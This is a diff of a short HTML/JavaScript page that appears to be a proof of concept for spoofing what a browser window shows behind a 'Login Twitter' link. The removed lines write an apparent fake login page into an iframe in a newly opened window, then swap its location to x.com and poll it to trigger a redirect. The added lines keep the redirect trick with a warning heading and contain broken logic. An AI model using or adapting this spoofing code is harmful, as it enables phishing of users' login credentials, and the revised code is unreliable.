@@ -1,14 +1,32 @@
 <script>
-    function next() {
-           w.location.replace('https://www.google.com:1234');
-          }
-  
-    function f() {
-      w = window.open("");
-    w.document.write('<iframe src="https://cnfdnfial-ops.github.io/test/login.html" width="600" height="400"></iframe>');
-        w.location = "https://x.com";
-      i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  function next() {
+    // Pastikan halaman yang dimaksud hanya dipanggil sekali setelah verifikasi
+    if (w.location.href !== 'https://x.com') {
+      w.location.replace('https://www.google.com:1234');
     }
-  </script>
-  
-  <a href="#" onclick="f()">Login Twitter</a>
+  }
+
+  function f() {
+    w = window.open("");  
+    w.document.write('<h2>This is not x.com!</h2>');
+    
+    // Verifikasi domain sebelum mengubah lokasi
+    setTimeout(function() {
+      w.location = "https://x.com";
+    }, 500); // Memberi delay untuk menghindari looping cepat
+    
+    // Atur kondisi berhenti jika manipulasi tidak diperlukan
+    setTimeout(function() {
+      try {
+        let url = w.location.href;
+        if (url !== "https://x.com") {
+          next();
+        }
+      } catch(e) {
+        clearInterval(i);
+      }
+    }, 500);
+  }
+</script>
+
+<a href="#" onclick="f()">Login Twitter</a>
